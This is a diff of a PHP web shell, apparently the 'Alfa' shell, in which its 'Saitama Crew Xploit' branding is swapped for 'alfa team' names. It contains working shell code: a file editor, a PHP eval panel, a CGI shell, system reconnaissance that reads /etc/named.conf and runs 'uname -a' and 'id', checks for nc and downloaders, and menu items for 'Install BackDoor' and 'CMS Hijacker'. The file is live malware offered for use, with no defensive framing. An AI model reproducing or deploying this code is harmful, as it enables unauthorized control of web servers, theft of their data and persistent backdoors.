if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=alfa_ace_editors.eval){for(var a in alfa_ace_editors.eval)alfa_ace_editors.eval[a].destroy();alfa_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("alfa_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return alfaSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=alfab64(t)),void 0!==l&&null!=l&&0!=l.length)n=alfab64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=alfab64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='http://solevisible.com/icons/menu/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),alfaloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?alfaloader(b,"block"):(alfaloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+alfab64("FilesTools")+"&c="+alfab64(f)+"&alfa1="+alfab64(e)+"&alfa2="+alfab64(a)+"&alfa3="+r+"&alfa4="+n+"&alfa5=&alfa6=&alfa7=&alfa8=&alfa9=&alfa10=&&ajax="+alfab64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&alfaUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?alfaLoaderOnTop("none"):alfaloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&alfaShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&alfaShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),alfaLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function alfaLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("alfa-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="alfa-ace-plugin",t.onload=function(){alfaLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==alfa_ace_editors.editor&&(alfa_ace_editors.editor={});var i=getCookie("alfa_ace_theme_editor"),l=getCookie("alfa_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),alfa_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),alfa_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),alfa_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),alfa_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),alfa_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),alfa_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),alfa_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==alfa_ace_editors.eval&&(alfa_ace_editors.eval={});i=getCookie("alfa_ace_theme_eval"),l=getCookie("alfa_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),alfa_ace_editors.eval["phpeval-"+o]=ace.edit(t),alfa_ace_editors.eval["phpeval-"+o].setReadOnly(a),alfa_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),alfa_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),alfa_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),alfa_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+alfab64("checkfiletype")+"&path="+alfab64(editor_files[t].pwd)+"&arg="+alfab64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","alfa","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("alfa_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=alfa_ace_editors.editor[e].selection.toJSON();alfa_ace_editors.editor[e].selectAll(),alfa_ace_editors.editor[e].focus(),document.execCommand("copy"),alfa_ace_editors.editor[e].selection.fromJSON(a),alfaShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=alfab64(e,!0),a=alfab64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return alfab64(i,!0)}function reloadSetting(e){return alfaloader(alfa_before_do_action_id,"block"),_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(e.protect.value)+"&alfa2="+alfab64(e.lgpage.value)+"&alfa3="+alfab64(e.username.value)+"&alfa4="+alfab64(e.password.value)+"&alfa5="+alfab64(">>")+"&alfa6="+alfab64(e.icon.value)+"&alfa7="+alfab64(e.post_encrypt.value)+"&alfa8="+alfab64("main")+"&alfa9="+alfab64(e.cgi_api.value)+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),alfaloader(a,"none")},!1,alfa_before_do_action_id),alfa_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(JSON.stringify(a))+"&alfa2="+alfab64(">>")+"&alfa3="+alfab64(t)+"&alfa8="+alfab64("color")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){evalJS(e)},!0)}function alfab64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __ALFA_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=alfa_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+alfab64("cgishell")+"&alfa1="+alfab64(e)+"&ajax="+alfab64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
 </script>
 <?php echo"<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
 <input type='hidden' name='a' value='dlfile'>
@@ -1083,7 +1084,7 @@ var saitama1_="",saitama2_="",saitama3_="",saitama4_="",saitama5_="",saitama6_="
 </form>
 <input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
 <div id='a_loader'><img src='".__showicon('loader')."'></div>";
-$cmd_uname = saitamaEx("uname -a",false,false);
+$cmd_uname = alfaEx("uname -a",false,false);
 $uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname)>0?$cmd_uname:'( php_uname ) Function Disabled !');
 if($uname=="( php_uname ) Function Disabled !"){$GLOBALS["need_to_update_header"]="true";}
 echo '
@@ -1095,11 +1096,11 @@ echo '
 <input type="hidden" name="a">
 <input type="hidden" name="c" value="'.$GLOBALS['cwd'].'">';
 for($s=1;$s<=10;$s++){
-echo '<input type="hidden" name="saitama'.$s.'">';
+echo '<input type="hidden" name="alfa'.$s.'">';
 }
 echo '<input type="hidden" name="charset">
 </form>
-<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#E6E6FA;">'.__saitama_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__saitama_VERSION__.'</span></small></a></div>
+<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
 <div class="header"><table width="100%" border="0">
 <tr>
 <td width="3%"><span class="header_vars">Uname:</span></td>
@@ -1108,7 +1109,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="Saitama Crew Xploit 2012" draggable="false" src="https://saitamacrewxploit.xyz/images/logo.png" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -1126,7 +1127,7 @@ echo '<input type="hidden" name="charset">
 <td><span class="header_vars">Domains:</span></td>
 <td width="76%"><span class="header_values" id="header_domains">';
 if($GLOBALS['sys']=='unix'){
-$d0mains = _saitama_file("/etc/named.conf",false);
+$d0mains = _alfa_file("/etc/named.conf",false);
 if(!$d0mains){echo "Cant Read [ /etc/named.conf ]";$GLOBALS["need_to_update_header"]="true";}else{
 $count=0;
 foreach($d0mains as $d0main){
@@ -1142,16 +1143,16 @@ echo '</span></td>
 </tr>
 <tr>
 <td height="16"><span class="header_vars">HDD:</span></td>
-<td><span class="header_vars">Total:</span><b>'.saitamaSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . saitamaSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
+<td><span class="header_vars">Total:</span><b>'.alfaSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . alfaSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
 </tr>';
 if($GLOBALS['sys']=='unix'){
 $useful_downloader = '<tr><td height="18" colspan="2"><span class="header_vars">useful:</span><span class="header_values" id="header_useful">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" id="header_downloader">--------------</span></td></tr>';
 if(!@ini_get('safe_mode')){
-if(strlen(saitamaEx("id",false,false))>0){
+if(strlen(alfaEx("id",false,false))>0){
 echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
-$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzisaitama2','nc','locate','suidperl');
+$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl');
 $x=0;
-foreach($userful as $item)if(saitamaWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
+foreach($userful as $item)if(alfaWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
 if($x==0){echo "<span class='header_values' id='header_useful'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
 echo '</td>
 </tr>
@@ -1159,7 +1160,7 @@ echo '</td>
 <td height="0" colspan="2"><span class="header_vars">Downloader: </span>';
 $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
 $x=0;
-foreach($downloaders as $item2)if(saitamaWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
+foreach($downloaders as $item2)if(alfaWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
 if($x==0){echo "<span class='header_values' id='header_downloader'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
 echo '</td>
 </tr>';
@@ -1171,7 +1172,7 @@ echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
 }
 }else{
 echo '<tr><td height="18" colspan="2"><span class="header_vars">Windows:</span><b>';
-echo saitamaEx('ver',false,false);
+echo alfaEx('ver',false,false);
 echo '</td>
 </tr> <tr>
 <td height="0" colspan="2"><span class="header_vars">Downloader: </span><b>-------------</b></td>
@@ -1179,10 +1180,10 @@ echo '</td>
 }
 $quotes = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($quotes == "1" or $quotes == "on"){$magic = '<b><span class="header_on">ON</span>';}else{$magic = '<span class="header_off">OFF</span>';}
 echo '<tr>
-<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.saitama_GetDisable_Function().'</b></td>
+<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="saitama_solevisible"><center><a href="https://www.youtube.com/@saitamacrewxploit2638" target="_blank"><span><font class="solevisible-text" color="#ff0800">Saitama Crew Xploit</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -1213,9 +1214,9 @@ $li = array('proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'
 'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','whois'=>'Whois','selfrm'=>'Remove Shell'
 );
 foreach($li as $key=>$value){
-echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="saitama_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
+echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
 }
-echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="saitama_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">saitama Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="saitama_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="saitama_plus">saitama market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="saitama_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['saitamaUser']) && !empty($_COOKIE['saitamaPass']) ? '<a href="javascript:void(0);" onclick="saitamaLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="saitamaFilesmanTabShowTitle(this,event);" onmouseout="saitamaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="saitamaFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
+echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Alfa Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="alfa_plus">Alfa market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['AlfaUser']) && !empty($_COOKIE['AlfaPass']) ? '<a href="javascript:void(0);" onclick="alfaLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" 